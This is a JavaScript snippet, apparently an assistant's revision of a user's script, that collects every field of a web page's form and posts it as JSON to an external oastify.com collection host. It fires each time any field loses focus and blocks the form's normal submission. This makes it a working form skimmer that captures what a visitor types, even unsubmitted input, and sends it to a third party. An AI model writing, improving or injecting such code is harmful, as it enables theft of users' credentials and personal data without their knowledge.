// --- Helper Function to Send Data ---
// I've moved your form serialization and fetch logic into this reusable function.
function sendFormData(formElement) {
    if (!formElement) {
        console.error('No form element provided to sendFormData.');
        return;
    }

    const formData = {};
    const elements = formElement.elements;

    // Loop through all form elements
    for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        const name = element.name;
        const value = element.value;

        if (name) {
            if (element.type === 'radio') {
                if (element.checked) {
                    formData[name] = value;
                }
            } else if (element.type === 'checkbox') {
                formData[name] = element.checked;
            } else {
                formData[name] = value;
            }
        }
    }

    const jsonData = JSON.stringify(formData, null, 2);
    console.log('Sending data:', jsonData); // Log the data being sent

    // Your fetch request
    fetch('https://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: jsonData,
    })
    .then(response => {
        // OAST servers usually just give a 200 OK.
        // .json() might fail, so let's just check the 'ok' status
        if (response.ok) {
            console.log('Success: Data sent.');
        } else {
            console.warn('Response was not OK:', response.status);
        }
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

// --- Main Logic ---

// 1. Find the form
const form = document.getElementById('form');

if (form) {
    // 2. NEW: Add a 'blur' event listener to the whole form
    // This uses event delegation to catch the 'blur' event
    // from any input, select, or textarea inside the form.
    form.addEventListener('blur', (event) => {
        // Check if the element that lost focus is an input field
        const targetTag = event.target.tagName;
        if (targetTag === 'INPUT' || targetTag === 'SELECT' || targetTag === 'TEXTAREA') {
            console.log(`Unfocus event on: ${event.target.name}`);
            sendFormData(form); // Send all form data
        }
    }, true); // 'true' uses event capturing, which is reliable for blur

} else {
    console.error('Form with ID "form" not found.');
}

// 3. ORIGINAL: Keep your submit button logic
// This will also send the data on the final click.
const submitButton = document.getElementById('btnComplete');

if (submitButton) {
    submitButton.addEventListener('click', function(event) {
        event.preventDefault(); // Stop the form from submitting normally
        console.log('Submit button clicked.');
        sendFormData(form); // Send all form data
    });
} else {
    // This warning is from your original script, it's good to keep
    console.warn('Submit button with ID "btnComplete" not found.');
}
